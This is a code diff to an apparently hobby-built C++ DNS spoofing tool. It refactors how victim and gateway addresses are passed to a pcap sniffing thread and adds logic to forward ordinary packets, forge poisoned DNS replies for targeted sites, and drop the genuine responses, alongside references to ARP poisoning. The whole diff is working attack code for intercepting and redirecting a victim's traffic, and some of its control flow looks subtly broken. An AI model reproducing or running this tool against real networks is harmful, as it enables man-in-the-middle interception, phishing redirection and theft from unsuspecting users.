@@ -16,16 +16,19 @@
 #include <fstream>
 #include <sstream>
 
+struct DnsSniffArgs {
+    NetworkEngine *net;
+    struct in_addr *victimIp;
+    struct in_addr *gatewayIP;
+    int rawSocket;
+};
+
 void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src, const struct in_addr &dst,
                      const unsigned short sport, const unsigned short dport,
                      const unsigned char *payload, const int payloadSize);
-void dnsSpoof(NetworkEngine *net);
+void dnsSpoof(struct DnsSniffArgs *args);
 void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                   const unsigned char *packet);
-
-// this is just the easiest way, probably move these later
-struct in_addr victimIp;
-struct in_addr gatewayIp;
 
 int main(int argc, const char *argv[]) {
     // Read strings from config file
@@ -35,6 +38,8 @@ int main(int argc, const char *argv[]) {
     // convert all the values from the config file to the correct format
     unsigned char attackerMac[ETH_ALEN];
 
+    struct in_addr victimIp;
+    struct in_addr gatewayIp;
     unsigned char *victimIpChar = (unsigned char *)&victimIp;
     unsigned char *gatewayIpChar = (unsigned char *)&gatewayIp;
 
@@ -124,7 +129,13 @@ int main(int argc, const char *argv[]) {
 
     // start dns sniffing
     std::cout << "starting dns sniff" << std::endl;
-    std::thread dnsThread(dnsSpoof, &ipEngine);
+
+    struct DnsSniffArgs dnsSniffArgs;
+    dnsSniffArgs.net = &ipEngine;
+    dnsSniffArgs.victimIp = &victimIp;
+    dnsSniffArgs.gatewayIP = &gatewayIp;
+    std::thread dnsThread(dnsSpoof, &dnsSniffArgs);
+
     std::cout << "dns sniffing started" << std::endl;
 
     // start arp poisoning
@@ -175,7 +186,7 @@ void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src, const str
     memcpy(buffer + 20 + 8, payload, payloadSize);
 }
 
-void dnsSpoof(NetworkEngine *net) {
+void dnsSpoof(struct DnsSniffArgs *args) {
     int i;
 
     pcap_t *session;
@@ -214,15 +225,17 @@ void dnsSpoof(NetworkEngine *net) {
         return;
     }
 
-    int rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    pcap_loop(session, 0, &dnsGotPacket, (unsigned char *)&rawSocket);
-    close(rawSocket);
+    args->rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    pcap_loop(session, 0, &dnsGotPacket, (unsigned char *)args);
+    close(args->rawSocket);
 
     pcap_freealldevs(allDevs);
 }
 
 void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                   const unsigned char *packet) {
+    struct DnsSniffArgs *params = (struct DnsSniffArgs *)args;
+
     // tmp fake spoofing address
     struct in_addr spoofIp;
     spoofIp.s_addr = 0x1300a8c0;
@@ -241,41 +254,56 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     udp = (udphdr *)(packet + 14 + 20);
     dns = (dnshdr *)(packet + 14 + 20 + 8);
 
-    if (dns->qr == 1) {
+    if (ip->saddr != params->victimIp->s_addr && ip->daddr != params->victimIp->s_addr) {
         return;
     }
 
-    if (ip->saddr != victimIp.s_addr) {
-        return;
-    }
-
-    unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
-    for (int i = 0; addressFilter[i]; i++) {
-        if (addressFilter[i] != query[i]) {
-            std::cout << "query not for site we care about" << std::endl;
-            return;
-        }
-    }
-
-    // craft the poisoned response
-    memset(buffer, 0, 1500);
-    int responseSize = forgeDns(dns, &spoofIp, buffer);
-    std::cout << "craft a response with size: " << responseSize << std::endl;
-
-    // reply
-    memset(frame, 0, 1500);
-    struct in_addr ogSrc;
-    struct in_addr ogDst;
-    ogSrc.s_addr = ntohl(ip->saddr);
-    ogDst.s_addr = ntohl(ip->daddr);
-    fillIpUdpHeader(frame, ogDst, ogSrc, ntohs(udp->dest), ntohs(udp->source), buffer,
-                    responseSize);
-
+    int bytesSent;
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_port = udp->dest;
     sin.sin_addr.s_addr = ip->saddr;
-    int bytesSent =
-        sendto(*(int *)args, frame, 20 + 8 + responseSize, 0, (struct sockaddr *)&sin, sizeof(sin));
-    std::cout << "sending reply, size: " << bytesSent << std::endl;
+
+    unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
+    if (dns->qr == DNS_QUERY) {
+        // is it for a site we care about
+        for (int i = 0; addressFilter[i]; i++) {
+            if (addressFilter[i] != query[i]) {
+                // forward the captured packet without the ethernet header
+                bytesSent = sendto(params->rawSocket, packet + 14, header->caplen - 14, 0,
+                                       (struct sockaddr *)&sin, sizeof(sin));
+                std::cout << "forwarding packet, size: " << bytesSent << std::endl;
+                return;
+            }
+
+            // it is for a site we care about, forge poisoned response
+            memset(buffer, 0, 1500); // optimize this
+            int responseSize = forgeDns(dns, &spoofIp, buffer);
+            std::cout << "craft a response with size: " << responseSize << std::endl;
+
+            // reply
+            memset(frame, 0, 1500); // optimize this
+            struct in_addr ogSrc;
+            struct in_addr ogDst;
+            ogSrc.s_addr = ntohl(ip->saddr);
+            ogDst.s_addr = ntohl(ip->daddr);
+            fillIpUdpHeader(frame, ogDst, ogSrc, ntohs(udp->dest), ntohs(udp->source), buffer,
+                            responseSize);
+            bytesSent = sendto(params->rawSocket, frame, 20 + 8 + responseSize, 0,
+                                   (struct sockaddr *)&sin, sizeof(sin));
+            std::cout << "sending reply, size: " << bytesSent << std::endl;
+        }
+    } else if (dns->qr == DNS_RESPONSE) {
+        // is it for a site we care about
+        for (int i = 0; addressFilter[i]; i++) {
+            if (addressFilter[i] != query[i]) {
+                // forward here
+                return;
+            }
+        }
+
+        // if it is the real response for a site we care about just drop it
+    }
+
+    // craft the poisoned response
 }
